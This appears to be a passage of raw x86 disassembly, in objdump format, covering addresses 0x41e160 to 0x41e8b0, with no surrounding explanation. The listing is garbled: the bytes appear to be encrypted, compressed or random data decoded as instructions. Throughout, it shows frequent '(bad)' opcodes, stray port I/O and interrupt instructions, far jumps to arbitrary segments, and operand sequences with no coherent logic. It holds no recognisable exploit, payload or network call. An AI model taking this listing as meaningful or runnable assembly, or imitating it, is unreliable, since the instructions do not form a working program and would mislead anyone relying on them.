  41e160:	int    0xcb
  41e162:	sub    al,BYTE PTR [eax]
  41e164:	ds cdq 
  41e166:	xor    eax,0x4d94634f
  41e16b:	out    dx,al
  41e16c:	outs   dx,BYTE PTR ds:[esi]
  41e16d:	into   
  41e16e:	leave  
  41e16f:	das    
  41e170:	pop    ebx
  41e171:	push   ds
  41e172:	add    eax,0xf724616f
  41e177:	xor    DWORD PTR [ebx-0xde8713],ebp
  41e17d:	jp     0x41e1ed
  41e17f:	arpl   WORD PTR [eax-0x23],cx
  41e182:	push   esi
  41e183:	push   0x47
  41e185:	cmp    edi,DWORD PTR [edx*4+0x4b391593]
  41e18c:	loopne 0x41e156
  41e18e:	imul   BYTE PTR [eax]
  41e190:	outs   dx,DWORD PTR ds:[esi]
  41e191:	(bad)  
  41e192:	push   ebp
  41e193:	int    0x61
  41e195:	add    al,0x30
  41e197:	pop    esp
  41e198:	cmp    BYTE PTR [edx],dl
  41e19a:	xchg   BYTE PTR [esi+0x28af2e1d],al
  41e1a0:	stos   DWORD PTR es:[edi],eax
  41e1a1:	sub    ebp,DWORD PTR [edi-0x226eea8e]
  41e1a7:	xchg   BYTE PTR [eax-0x59a2541d],bh
  41e1ad:	lahf   
  41e1ae:	push   ebx
  41e1af:	loopne 0x41e1b3
  41e1b1:	(bad)  
  41e1b2:	jmp    0xecea:0x1ca0037
  41e1b9:	nop
  41e1ba:	push   0xffffffab
  41e1bc:	aad    0xc0
  41e1be:	dec    esp
  41e1bf:	mov    esp,0x6e8b2f4
  41e1c4:	jg     0x41e243
  41e1c6:	cmp    al,0xab
  41e1c8:	ja     0x41e192
  41e1ca:	shr    DWORD PTR [edi+0x30b57962],0xbf
  41e1d1:	inc    esi
  41e1d2:	mov    ds:0x55ba51a4,eax
  41e1d7:	and    esp,DWORD PTR [ebx-0x59]
  41e1da:	mov    edx,0xec65a4de
  41e1df:	and    DWORD PTR [esp+ecx*2-0x2c62bfc3],ebx
  41e1e6:	push   edx
  41e1e7:	add    eax,0xb110661f
  41e1ec:	icebp  
  41e1ed:	add    DWORD PTR [ecx+0x69],ebp
  41e1f0:	test   BYTE PTR [edx+0x69],dl
  41e1f3:	inc    edi
  41e1f4:	dec    eax
  41e1f5:	inc    BYTE PTR [edx]
  41e1f7:	push   eax
  41e1f8:	adc    DWORD PTR [ebx-0x53],esi
  41e1fb:	rcl    DWORD PTR [ecx+0x4c],cl
  41e1fe:	sub    eax,0x55090e07
  41e203:	cmp    DWORD PTR [ebp-0x226f9a79],ebx
  41e209:	pop    ds
  41e20a:	in     al,dx
  41e20b:	call   0x611004b1
  41e210:	(bad)  
  41e211:	neg    DWORD PTR [edi-0x59069603]
  41e217:	cmp    DWORD PTR [ebx+0x47],edi
  41e21a:	aas    
  41e21b:	pop    ds
  41e21c:	shr    BYTE PTR [ebp+0x140001ab],0x86
  41e223:	mov    cl,0x2
  41e225:	and    al,bh
  41e227:	mov    ds:0x1ecac46e,al
  41e22c:	push   edx
  41e22d:	dec    eax
  41e22e:	fstp   DWORD PTR [ecx-0x1]
  41e231:	mov    edi,0x82a614b7
  41e236:	rcl    BYTE PTR [edi],0xfb
  41e239:	loope  0x41e203
  41e23b:	inc    edx
  41e23c:	push   esi
  41e23d:	leave  
  41e23e:	adc    DWORD PTR [edi-0x3821bc5d],edx
  41e244:	pop    ebp
  41e245:	sub    eax,0x3b2ab42a
  41e24a:	mov    dl,0xea
  41e24c:	imul   edx,DWORD PTR [eax-0xc0dc91f],0x48
  41e253:	ins    BYTE PTR es:[edi],dx
  41e254:	mov    al,0x3
  41e256:	fidiv  WORD PTR [ecx]
  41e258:	outs   dx,BYTE PTR ds:[esi]
  41e259:	xor    ch,al
  41e25b:	cmp    DWORD PTR [eax+0x239b39fc],eax
  41e261:	xor    ecx,ecx
  41e263:	mov    ds:0x6e15665d,al
  41e268:	push   ebp
  41e269:	push   ebp
  41e26a:	daa    
  41e26b:	bound  ecx,QWORD PTR [edx]
  41e26d:	mov    WORD PTR [ebx+0x5fc5696d],ds
  41e273:	add    eax,0x40ee2e8e
  41e278:	(bad)  
  41e279:	mov    ah,0x60
  41e27b:	and    eax,0xdb8c59cd
  41e280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e281:	cwde   
  41e282:	adc    al,0x75
  41e284:	push   edi
  41e285:	stos   BYTE PTR es:[edi],al
  41e286:	cli    
  41e287:	ins    DWORD PTR es:[edi],dx
  41e288:	inc    BYTE PTR [ebx]
  41e28a:	lods   eax,DWORD PTR ds:[esi]
  41e28b:	or     eax,0xe2217f91
  41e290:	xor    al,0x19
  41e292:	mov    ds,WORD PTR [ebp+ebp*2-0x6c]
  41e296:	mov    ebx,0xfab3501b
  41e29b:	jecxz  0x41e27f
  41e29d:	push   ebx
  41e29e:	in     eax,0x13
  41e2a0:	and    DWORD PTR [ecx+0x1d],ebp
  41e2a3:	mov    dh,0x5d
  41e2a5:	aas    
  41e2a6:	push   0xffffff96
  41e2a8:	and    al,bl
  41e2aa:	push   ds
  41e2ab:	adc    eax,0xbc7b79a6
  41e2b0:	jnp    0x41e306
  41e2b2:	mov    ebp,DWORD PTR [eax-0xa]
  41e2b5:	xlat   BYTE PTR ds:[ebx]
  41e2b6:	pop    ecx
  41e2b7:	xor    al,0x9b
  41e2b9:	call   0xbcfafdf0
  41e2be:	fiadd  WORD PTR [ebp+0x5b]
  41e2c1:	lds    ecx,FWORD PTR [eax]
  41e2c3:	xor    BYTE PTR [ebp-0x56a52c4f],ch
  41e2c9:	dec    ecx
  41e2ca:	xchg   ecx,eax
  41e2cb:	dec    edx
  41e2cc:	inc    esi
  41e2cd:	int3   
  41e2ce:	(bad)  
  41e2cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2d0:	aam    0xd2
  41e2d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2d3:	loope  0x41e255
  41e2d5:	or     esi,ebx
  41e2d7:	and    al,0xff
  41e2d9:	loop   0x41e293
  41e2db:	or     eax,0x8d891b83
  41e2e0:	xchg   esi,eax
  41e2e1:	iret   
  41e2e2:	xlat   BYTE PTR ds:[ebx]
  41e2e3:	out    0x8e,al
  41e2e5:	add    dl,0x1f
  41e2e8:	popa   
  41e2e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2ea:	sbb    eax,0xc397056b
  41e2ef:	adc    ah,bl
  41e2f1:	mov    eax,0x171de783
  41e2f6:	nop
  41e2f7:	(bad)  
  41e2f8:	(bad)  
  41e2f9:	(bad)  
  41e2fb:	mov    ebp,0x7766afa9
  41e300:	in     al,dx
  41e301:	jbe    0x41e295
  41e303:	bound  eax,QWORD PTR [eax+0x6e]
  41e306:	jecxz  0x41e385
  41e308:	push   eax
  41e309:	fiadd  DWORD PTR [eax*1-0x7363cde7]
  41e310:	mov    cs,ebp
  41e312:	std    
  41e313:	jmp    0xd17e:0x2c62023d
  41e31a:	xchg   ebx,eax
  41e31b:	push   cs
  41e31c:	adc    BYTE PTR [ebp-0x5161cc31],al
  41e322:	xor    ch,cl
  41e324:	and    DWORD PTR [esi],0x743f4355
  41e32a:	mov    edi,0x2490f9b5
  41e32f:	or     BYTE PTR [edx],ch
  41e331:	pop    esi
  41e332:	test   al,0xaa
  41e334:	push   esi
  41e335:	(bad)  
  41e336:	mov    bh,0x4d
  41e338:	(bad)  
  41e339:	sub    BYTE PTR ds:0xe2d00bcd,bh
  41e33f:	xor    eax,0x45b8cbba
  41e344:	pop    edi
  41e345:	mov    ecx,0xd0811066
  41e34a:	xchg   DWORD PTR [edx-0x7cb14984],esi
  41e350:	mov    bl,0x68
  41e352:	mov    esi,0xb26a9a2c
  41e357:	fisub  DWORD PTR [ebx-0x4c486499]
  41e35d:	jg     0x41e385
  41e35f:	add    al,bh
  41e361:	jmp    0x41e341
  41e363:	mov    ds:0x3e0e472c,al
  41e368:	pop    edi
  41e369:	jmp    0x371dfc28
  41e36e:	addr16 ds inc edx
  41e371:	fdiv   DWORD PTR [ebx]
  41e373:	fs (bad) 
  41e375:	in     eax,0x6d
  41e377:	push   ds
  41e378:	xor    eax,0x7a945420
  41e37d:	iret   
  41e37e:	stos   BYTE PTR es:[edi],al
  41e37f:	mov    esp,DWORD PTR [eax-0x603229f3]
  41e385:	sbb    al,0x89
  41e387:	stos   BYTE PTR es:[edi],al
  41e388:	pop    edi
  41e389:	(bad)  
  41e38a:	xchg   ecx,eax
  41e38b:	loope  0x41e3e7
  41e38d:	in     eax,0xac
  41e38f:	pop    esi
  41e390:	lock std 
  41e392:	adc    ebx,esp
  41e394:	adc    ebp,DWORD PTR [esi+0x7a]
  41e397:	daa    
  41e398:	popf   
  41e399:	(bad)  
  41e39a:	or     al,0x18
  41e39c:	pop    eax
  41e39d:	fxch   st(1)
  41e39f:	mov    dh,0x82
  41e3a1:	stc    
  41e3a2:	pop    es
  41e3a3:	mov    ecx,DWORD PTR ds:0xb34f5208
  41e3a9:	inc    edx
  41e3aa:	pusha  
  41e3ab:	mov    al,ch
  41e3ad:	ds test BYTE PTR ss:[esi-0x4a],cl
  41e3b2:	sub    al,0x96
  41e3b4:	xchg   ecx,eax
  41e3b5:	xchg   esi,ebx
  41e3b7:	xchg   ecx,eax
  41e3b8:	into   
  41e3b9:	xor    al,0x94
  41e3bb:	leave  
  41e3bc:	test   esp,eax
  41e3be:	arpl   di,bp
  41e3c0:	dec    esp
  41e3c1:	dec    edi
  41e3c2:	xchg   DWORD PTR [ecx],ecx
  41e3c4:	test   ebx,esp
  41e3c6:	(bad)  
  41e3c7:	int    0xf1
  41e3c9:	in     eax,dx
  41e3ca:	(bad)  
  41e3cb:	in     eax,dx
  41e3cc:	mov    ds:0x280a4506,eax
  41e3d1:	mov    dl,0x4e
  41e3d3:	sub    ebp,DWORD PTR [ebx+0x21]
  41e3d6:	dec    ebp
  41e3d7:	dec    ebp
  41e3d8:	test   DWORD PTR [eax-0x1400f5f],ebp
  41e3de:	inc    eax
  41e3df:	(bad)  
  41e3e0:	and    bl,BYTE PTR [esp+eiz*2+0x788e4397]
  41e3e7:	(bad)  
  41e3e8:	sbb    BYTE PTR [edx+ebp*2],bh
  41e3eb:	jg     0x41e454
  41e3ed:	inc    edi
  41e3ee:	xchg   ebp,eax
  41e3ef:	dec    ecx
  41e3f0:	push   esi
  41e3f1:	int    0x4f
  41e3f3:	mov    ebp,0xce2fab78
  41e3f8:	stc    
  41e3f9:	aas    
  41e3fa:	and    eax,edx
  41e3fc:	ja     0x41e3a6
  41e3fe:	xchg   ecx,eax
  41e3ff:	cs nop
  41e401:	mov    ebx,0xa37b8e33
  41e406:	fcmovnb st,st(3)
  41e408:	cwde   
  41e409:	jecxz  0x41e47d
  41e40b:	out    dx,eax
  41e40c:	adc    dl,ch
  41e40e:	nop
  41e40f:	retf   0xe1eb
  41e412:	jmp    0xbd9a55ff
  41e417:	dec    ecx
  41e418:	mov    bh,0x9d
  41e41a:	xchg   esi,eax
  41e41b:	and    eax,0xc676a3a
  41e420:	push   ebx
  41e421:	add    eax,0xb00208bf
  41e426:	ins    BYTE PTR es:[edi],dx
  41e427:	add    BYTE PTR [ebp+0x719edba9],0xd3
  41e42e:	(bad)  
  41e42f:	in     al,0xf9
  41e431:	pop    ebp
  41e432:	mov    bh,0x1
  41e434:	add    esp,DWORD PTR [eax-0x2b]
  41e437:	push   ebx
  41e438:	fwait
  41e439:	in     eax,dx
  41e43a:	mov    ebp,0xb3f83bb3
  41e43f:	lahf   
  41e440:	jecxz  0x41e476
  41e442:	mov    ch,0x47
  41e444:	icebp  
  41e445:	mov    edx,DWORD PTR [edx]
  41e447:	jnp    0x41e41b
  41e449:	loop   0x41e464
  41e44b:	sub    BYTE PTR [esi+0x55],bl
  41e44e:	jl     0x41e3d9
  41e450:	cmp    dl,BYTE PTR [esi]
  41e452:	and    ch,al
  41e454:	shr    BYTE PTR [esp+edx*8+0x10222340],1
  41e45b:	shl    BYTE PTR [edi],cl
  41e45d:	fst    QWORD PTR ds:0xd05f3b04
  41e463:	push   DWORD PTR [esi-0x1e63175f]
  41e469:	add    al,0x86
  41e46b:	mov    al,ds:0xb15b5d4c
  41e470:	lea    eax,ds:[ecx-0x5b]
  41e474:	mov    eax,ds:0x7c537da3
  41e479:	push   ss
  41e47a:	mov    al,ds:0x3b76294e
  41e47f:	int    0x2f
  41e481:	ins    DWORD PTR es:[edi],dx
  41e482:	xor    al,cl
  41e484:	jne    0x41e4af
  41e486:	out    dx,eax
  41e487:	ins    DWORD PTR es:[edi],dx
  41e488:	retf   
  41e489:	std    
  41e48a:	xor    bl,BYTE PTR [esi-0x36631068]
  41e490:	outs   dx,DWORD PTR ds:[esi]
  41e491:	inc    esp
  41e492:	mov    bh,0xfe
  41e494:	pop    ds
  41e495:	(bad)
  41e499:	enter  0x3f3,0xdf
  41e49d:	xchg   ebp,eax
  41e49e:	xor    ebp,eax
  41e4a0:	js     0x41e444
  41e4a2:	scas   eax,DWORD PTR es:[edi]
  41e4a3:	xchg   esp,eax
  41e4a4:	data16 mov bl,0x6d
  41e4a7:	das    
  41e4a8:	mov    esi,0x739ed47d
  41e4ad:	inc    ebx
  41e4ae:	jnp    0x41e4b4
  41e4b0:	inc    eax
  41e4b1:	dec    edx
  41e4b2:	mov    bl,0x1a
  41e4b4:	cmp    edx,edi
  41e4b6:	shrd   DWORD PTR [ecx+0x14064f7c],esp,cl
  41e4bd:	and    BYTE PTR [edx+0x5933dd81],ch
  41e4c3:	test   al,0x83
  41e4c5:	leave  
  41e4c6:	clc    
  41e4c7:	jmp    0x41e53d
  41e4c9:	(bad)  
  41e4cb:	outs   dx,BYTE PTR ds:[esi]
  41e4cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4cd:	sahf   
  41e4ce:	mov    cl,bl
  41e4d0:	push   ss
  41e4d1:	jmp    0x4a149b1e
  41e4d6:	mov    ebp,ecx
  41e4d8:	pop    ecx
  41e4d9:	into   
  41e4da:	xchg   ebx,eax
  41e4db:	sti    
  41e4dc:	jmp    0xfb88:0x17d8256a
  41e4e3:	jo     0x41e4da
  41e4e5:	out    dx,al
  41e4e6:	pop    esi
  41e4e7:	mov    ?,WORD PTR [esi]
  41e4e9:	pop    esi
  41e4ea:	mov    dh,0x0
  41e4ec:	dec    edi
  41e4ed:	pop    esp
  41e4ee:	popa   
  41e4ef:	mov    bl,0x4f
  41e4f1:	(bad)  
  41e4f2:	cdq    
  41e4f3:	adc    al,0xce
  41e4f5:	pop    es
  41e4f6:	sti    
  41e4f7:	std    
  41e4f8:	pop    esi
  41e4f9:	dec    ecx
  41e4fa:	cwde   
  41e4fb:	rcr    BYTE PTR [edi],1
  41e4fd:	push   cs
  41e4fe:	fmul   st(7),st
  41e500:	mov    WORD PTR [eax-0x5f1e1fb5],?
  41e506:	iret   
  41e507:	stc    
  41e508:	inc    eax
  41e509:	shr    edi,0xe3
  41e50c:	scas   eax,DWORD PTR es:[edi]
  41e50d:	cmp    DWORD PTR [edx],edx
  41e50f:	mov    es,WORD PTR [esi]
  41e511:	shl    BYTE PTR [esi-0x2027408c],1
  41e517:	ins    BYTE PTR es:[edi],dx
  41e518:	shl    DWORD PTR [edi-0x25],1
  41e51b:	loope  0x41e561
  41e51d:	dec    ecx
  41e51e:	(bad)  [esi-0x642bcf5b]
  41e524:	cmp    DWORD PTR [ebx+edi*2+0x336c4751],esp
  41e52b:	out    dx,eax
  41e52c:	sbb    DWORD PTR [ebp+0x13bdcbdb],edx
  41e532:	lds    esi,FWORD PTR [ebp-0x5b6ed30e]
  41e538:	xchg   esp,eax
  41e539:	inc    ebx
  41e53a:	xchg   ebp,eax
  41e53b:	fld    QWORD PTR [eax-0x416d1fee]
  41e541:	out    0xc6,eax
  41e543:	dec    ecx
  41e544:	mov    bh,BYTE PTR ds:[ebp+0x47]
  41e548:	push   ebx
  41e549:	loope  0x41e4f2
  41e54b:	cld    
  41e54c:	stos   BYTE PTR es:[edi],al
  41e54d:	fnsave [ecx+0x3e]
  41e550:	jbe    0x41e4d2
  41e552:	in     al,dx
  41e553:	add    eax,0x7c7219d2
  41e558:	jae    0x41e545
  41e55a:	rol    ah,0x92
  41e55d:	xchg   esp,eax
  41e55e:	push   esp
  41e55f:	sahf   
  41e560:	jo     0x41e59f
  41e562:	pop    ebp
  41e563:	aas    
  41e564:	bound  ebp,QWORD PTR [ebp*2-0x2aabe433]
  41e56b:	mov    ds:0x7dd4a978,al
  41e570:	inc    ebx
  41e571:	nop
  41e572:	mov    edx,0xd1d32a67
  41e577:	mov    cl,0x8b
  41e579:	jl     0x41e54a
  41e57b:	pop    es
  41e57c:	jp     0x41e5d7
  41e57e:	cmp    BYTE PTR [ebp-0x3f],0x75
  41e582:	nop
  41e583:	jnp    0x41e56e
  41e585:	and    DWORD PTR [esi-0x392c3266],ebx
  41e58b:	test   al,0xb1
  41e58d:	pusha  
  41e58e:	mov    al,0x12
  41e590:	jecxz  0x41e524
  41e592:	add    esp,DWORD PTR [edi-0x28a752e1]
  41e598:	stos   BYTE PTR es:[edi],al
  41e599:	hlt    
  41e59a:	lea    ebp,[esi-0x1280ef0a]
  41e5a0:	jg     0x41e555
  41e5a2:	gs xchg ebp,eax
  41e5a4:	xor    ebx,DWORD PTR [ebx-0x468c5764]
  41e5aa:	mov    esp,0x15f19863
  41e5af:	loop   0x41e5fb
  41e5b1:	jmp    0xa30c:0x5418e647
  41e5b8:	push   es
  41e5b9:	xlat   BYTE PTR ds:[ebx]
  41e5ba:	ins    BYTE PTR es:[edi],dx
  41e5bb:	addr16 (bad) 
  41e5be:	out    dx,al
  41e5bf:	fwait
  41e5c0:	mov    eax,0x195eec8e
  41e5c5:	and    esi,ecx
  41e5c7:	fmul   QWORD PTR ds:0x3d6203d8
  41e5cd:	jge    0x41e633
  41e5cf:	push   ss
  41e5d0:	mov    ecx,0xd1250a5f
  41e5d5:	xor    eax,0x325ffb1c
  41e5da:	xchg   esi,eax
  41e5db:	dec    esp
  41e5dc:	and    eax,0x1c59c172
  41e5e1:	push   0xffffff81
  41e5e3:	cmp    DWORD PTR [ebx-0x5294153a],esi
  41e5e9:	sub    BYTE PTR [ebp-0x3c1675f2],0x91
  41e5f0:	in     al,0xeb
  41e5f2:	adc    eax,DWORD PTR ds:0xf101e1f9
  41e5f8:	cmc    
  41e5f9:	pusha  
  41e5fa:	icebp  
  41e5fb:	cmc    
  41e5fc:	call   0xc331:0x5856a212
  41e603:	daa    
  41e604:	stc    
  41e605:	dec    edi
  41e606:	(bad)  
  41e607:	lods   eax,DWORD PTR ds:[esi]
  41e608:	xor    BYTE PTR [esi+0xa2a63b4],dh
  41e60e:	je     0x41e614
  41e610:	retf   
  41e611:	xchg   ebx,eax
  41e612:	pop    ds
  41e613:	add    DWORD PTR [edx-0x40],esi
  41e616:	xor    DWORD PTR [edi+eax*8],ecx
  41e619:	stos   DWORD PTR es:[edi],eax
  41e61a:	cld    
  41e61b:	fist   WORD PTR [edx+0x70]
  41e61e:	aam    0xe6
  41e620:	imul   ebp,DWORD PTR fs:[ebx],0x316352bc
  41e627:	push   cs
  41e628:	mov    dl,0xb9
  41e62a:	mov    WORD PTR [esi-0x53],gs
  41e62d:	stos   BYTE PTR es:[edi],al
  41e62e:	cdq    
  41e62f:	(bad)  
  41e630:	(bad)  
  41e631:	xchg   edi,eax
  41e632:	dec    ebx
  41e633:	stos   DWORD PTR es:[edi],eax
  41e634:	pop    ecx
  41e635:	sub    bl,ah
  41e637:	add    DWORD PTR [eax+0x69548fed],edx
  41e63d:	idiv   ecx
  41e63f:	adc    ebp,0xdf24040
  41e645:	mov    dh,0xea
  41e647:	add    eax,0x1da50985
  41e64c:	jl     0x41e69f
  41e64e:	jge    0x41e698
  41e650:	xchg   edi,eax
  41e651:	std    
  41e652:	sub    al,BYTE PTR [edi-0x6e]
  41e655:	outs   dx,DWORD PTR ds:[esi]
  41e656:	push   edi
  41e657:	data16 ficomp WORD PTR [ebx]
  41e65a:	(bad)  
  41e65b:	arpl   WORD PTR ds:0x2cf40a80,di
  41e661:	das    
  41e662:	mov    esp,DWORD PTR [eax]
  41e664:	cmp    DWORD PTR [edi],edi
  41e666:	cmp    eax,0x815d695a
  41e66b:	mov    ecx,DWORD PTR [eax-0x33]
  41e66e:	jecxz  0x41e67a
  41e670:	retf   0x1d31
  41e673:	inc    ebp
  41e674:	pop    es
  41e675:	stc    
  41e676:	adc    eax,0xffffff9d
  41e679:	inc    ecx
  41e67a:	int3   
  41e67b:	mov    ch,0x22
  41e67d:	sbb    eax,0x343cd220
  41e682:	sub    edx,DWORD PTR ds:0xa9ae8373
  41e688:	test   DWORD PTR [eax],edx
  41e68a:	and    al,0x31
  41e68c:	and    DWORD PTR [esp+esi*4-0x3eed364c],edx
  41e693:	fmul   DWORD PTR [ebp+0x59]
  41e696:	jp     0x41e633
  41e698:	(bad)  
  41e699:	iret   
  41e69a:	mov    BYTE PTR [edi-0x22],al
  41e69d:	mov    ah,0x2e
  41e69f:	sbb    BYTE PTR [ecx-0x15d00df5],dh
  41e6a5:	imul   ebx,DWORD PTR [edx+0x1d32095e],0x68
  41e6ac:	dec    ebp
  41e6ad:	push   edx
  41e6ae:	push   es
  41e6af:	add    ch,BYTE PTR gs:[esi]
  41e6b2:	push   ecx
  41e6b3:	push   0x39
  41e6b5:	mov    bh,0x56
  41e6b7:	or     ah,dl
  41e6b9:	sti    
  41e6ba:	push   esp
  41e6bb:	aaa    
  41e6bc:	dec    ebp
  41e6bd:	or     al,0xb3
  41e6bf:	push   ebp
  41e6c0:	push   eax
  41e6c1:	jno    0x41e6df
  41e6c3:	inc    eax
  41e6c4:	rcl    esp,1
  41e6c6:	mov    WORD PTR [eax-0x59ed3e9e],cs
  41e6cc:	push   ecx
  41e6cd:	fld    DWORD PTR [esi+0x25]
  41e6d0:	add    al,0x48
  41e6d2:	(bad)  
  41e6d3:	pushf  
  41e6d4:	aad    0x97
  41e6d6:	sub    bl,BYTE PTR ds:0x4c121c39
  41e6dc:	retf   0x7820
  41e6df:	push   es
  41e6e0:	daa    
  41e6e1:	stos   DWORD PTR es:[edi],eax
  41e6e2:	lds    ebx,FWORD PTR [ebp+0x4449b233]
  41e6e8:	push   edi
  41e6e9:	push   es
  41e6ea:	inc    ebx
  41e6eb:	cmc    
  41e6ec:	cmc    
  41e6ed:	popa   
  41e6ee:	xchg   BYTE PTR [ebp+eax*2-0x6e0a04c3],cl
  41e6f5:	cmp    BYTE PTR [edi+0x7f],cl
  41e6f8:	xor    al,al
  41e6fa:	gs rcr ah,1
  41e6fd:	sbb    DWORD PTR [edi],0xdd6dec60
  41e703:	push   0x475b0eed
  41e708:	(bad)  
  41e709:	sbb    edi,DWORD PTR [ecx]
  41e70b:	jmp    0x3b2213bb
  41e710:	leave  
  41e711:	nop
  41e712:	jbe    0x41e6dc
  41e714:	fist   DWORD PTR [eax-0x570be569]
  41e71a:	sbb    ecx,DWORD PTR [esi+0x55]
  41e71d:	(bad)  
  41e71e:	bound  esp,QWORD PTR [ebp+0x1c1f2df1]
  41e724:	cmp    ebp,DWORD PTR [ecx-0x14]
  41e727:	cmp    edx,ebx
  41e729:	test   eax,0xb4eb42da
  41e72e:	fcom   DWORD PTR ds:0x7d47dd1e
  41e734:	outs   dx,DWORD PTR ds:[esi]
  41e735:	es ret 
  41e737:	dec    edx
  41e738:	(bad)  
  41e739:	push   esi
  41e73a:	pop    ecx
  41e73b:	cwde   
  41e73c:	xchg   esi,eax
  41e73d:	lods   eax,DWORD PTR ds:[esi]
  41e73e:	dec    esp
  41e73f:	fild   QWORD PTR [ecx-0x2be2e315]
  41e745:	cmp    BYTE PTR [ebp-0x3e2d0b3],dl
  41e74b:	mov    bl,0x96
  41e74d:	sbb    DWORD PTR [ebx-0x43ab74ad],0x264ee2f8
  41e757:	retf   0xbc6d
  41e75a:	out    0x3a,eax
  41e75c:	repz int 0xbb
  41e75f:	sti    
  41e760:	sbb    eax,DWORD PTR [esi-0x5f]
  41e763:	xor    al,0x8
  41e765:	nop    DWORD PTR [ebx-0x4a]
  41e769:	ins    BYTE PTR es:[edi],dx
  41e76a:	imul   esp,eax,0xfffffff6
  41e76d:	daa    
  41e76e:	gs pop eax
  41e770:	in     eax,dx
  41e771:	rcr    edi,0xc2
  41e774:	mov    esp,0x1975be2a
  41e779:	sbb    eax,0x8ad5076
  41e77e:	adc    eax,0xee773a13
  41e783:	pop    esp
  41e784:	mov    DWORD PTR [edi+0x5e],ebp
  41e787:	push   edi
  41e788:	sub    bh,0xbb
  41e78b:	loop   0x41e7a0
  41e78d:	pop    edx
  41e78e:	jecxz  0x41e7a7
  41e790:	dec    ebx
  41e791:	or     eax,0xee6b89a2
  41e796:	stos   BYTE PTR es:[edi],al
  41e797:	(bad)  
  41e798:	stc    
  41e799:	ins    BYTE PTR es:[edi],dx
  41e79a:	jecxz  0x41e770
  41e79c:	jmp    0x5805:0x8ccfc38e
  41e7a3:	pop    ebp
  41e7a4:	pop    edi
  41e7a5:	inc    edx
  41e7a6:	adc    BYTE PTR [ecx+0x12],dh
  41e7a9:	mov    dl,bl
  41e7ab:	cmp    DWORD PTR [eax-0x7a40f4c9],0xc33fa620
  41e7b5:	data16 jnp 0x41e744
  41e7b8:	mov    BYTE PTR [edi],bh
  41e7ba:	int3   
  41e7bb:	mov    dl,0xb5
  41e7bd:	pop    es
  41e7be:	xor    eax,0xfad0d489
  41e7c3:	sub    bl,al
  41e7c5:	cmp    BYTE PTR es:[ecx-0x2e],bh
  41e7c9:	sbb    dh,al
  41e7cb:	outs   dx,DWORD PTR ds:[esi]
  41e7cc:	test   DWORD PTR [ebx+0x731104cc],edi
  41e7d2:	mov    ch,0x65
  41e7d4:	cmp    DWORD PTR [eax],edi
  41e7d6:	or     eax,0x276130da
  41e7db:	jl     0x41e805
  41e7dd:	int    0x76
  41e7df:	pushf  
  41e7e0:	add    ecx,ebx
  41e7e2:	je     0x41e787
  41e7e4:	icebp  
  41e7e5:	dec    ecx
  41e7e6:	shr    DWORD PTR [edx+0x7c],0x6b
  41e7ea:	fld    DWORD PTR [edx-0x6a]
  41e7ed:	loop   0x41e7f4
  41e7ef:	mov    esi,0x188e0505
  41e7f4:	adc    al,0x34
  41e7f6:	loopne 0x41e85e
  41e7f8:	popa   
  41e7f9:	inc    ebx
  41e7fa:	adc    al,0x1f
  41e7fc:	pop    ecx
  41e7fd:	jbe    0x41e7a6
  41e7ff:	ja     0x41e856
  41e801:	ins    BYTE PTR es:[edi],dx
  41e802:	xor    BYTE PTR [ebp-0x48],cl
  41e805:	fidivr WORD PTR [ebx-0x72]
  41e808:	icebp  
  41e809:	mov    esi,0xd5aaebda
  41e80e:	inc    BYTE PTR ds:0xa84f19ec
  41e814:	jno    0x41e7e1
  41e816:	inc    edx
  41e817:	int    0x77
  41e819:	inc    ebp
  41e81a:	cmp    eax,0xeb4cceb2
  41e81f:	out    dx,eax
  41e820:	dec    esi
  41e821:	das    
  41e822:	xor    DWORD PTR [edi-0x2],esi
  41e825:	mov    ?,WORD PTR [edx]
  41e827:	jmp    0x41e7d7
  41e829:	cdq    
  41e82a:	sub    ch,ah
  41e82c:	push   edx
  41e82d:	sbb    al,0xca
  41e82f:	push   edx
  41e830:	out    dx,eax
  41e831:	cwde   
  41e832:	inc    esi
  41e833:	xlat   BYTE PTR ds:[ebx]
  41e834:	mov    ds:0xd1e83468,eax
  41e839:	add    ch,cl
  41e83b:	xor    BYTE PTR [edi+0x2a],0xbf
  41e83f:	inc    ebx
  41e840:	ja     0x41e879
  41e842:	sti    
  41e843:	retf   
  41e844:	stc    
  41e845:	fs cmp edi,ecx
  41e848:	ret    0x8b1f
  41e84b:	stos   DWORD PTR es:[edi],eax
  41e84c:	push   edi
  41e84d:	shl    BYTE PTR [edx-0x3f18871d],1
  41e853:	out    dx,al
  41e854:	(bad)  
  41e855:	in     al,0xa
  41e857:	pop    ebx
  41e858:	in     eax,dx
  41e859:	jmp    0x41e7fe
  41e85b:	xchg   esi,eax
  41e85c:	dec    edi
  41e85d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e85e:	lods   al,BYTE PTR ds:[esi]
  41e85f:	dec    edx
  41e860:	test   eax,0xdb7ff1c2
  41e865:	cmp    DWORD PTR [ebx],edi
  41e867:	xor    dh,BYTE PTR [edx+0xa811a38]
  41e86d:	mov    ?,WORD PTR [edx-0x295419ec]
  41e873:	scas   eax,DWORD PTR es:[edi]
  41e874:	js     0x41e8f5
  41e876:	add    ch,BYTE PTR [ebp+0x65ebc1d3]
  41e87c:	stos   DWORD PTR es:[edi],eax
  41e87d:	sub    esp,DWORD PTR [ecx+0x3a]
  41e880:	inc    ebp
  41e881:	ins    BYTE PTR es:[edi],dx
  41e882:	or     ebp,DWORD PTR [edi]
  41e884:	and    al,0xa1
  41e886:	ret    0x2483
  41e889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e88a:	or     bl,BYTE PTR [esi]
  41e88c:	dec    ecx
  41e88d:	and    ch,BYTE PTR [edi]
  41e88f:	arpl   WORD PTR [edx+eiz*1+0x337a170a],bx
  41e896:	scas   eax,DWORD PTR es:[edi]
  41e897:	(bad)  
  41e898:	fld    TBYTE PTR [edi+0x45ec6aa8]
  41e89e:	push   0xffffff80
  41e8a0:	sub    BYTE PTR [eax],ch
  41e8a2:	cwde   
  41e8a3:	or     al,0xb4
  41e8a5:	xor    DWORD PTR [ebx+0x40],ebp
  41e8a8:	loop   0x41e83c
  41e8aa:	sti    
  41e8ab:	mov    ebx,DWORD PTR [esi-0x35]
  41e8ae:	push   0x70
  41e8b0:	cmp    ch,BYTE PTR [eax+esi*1+0x29]
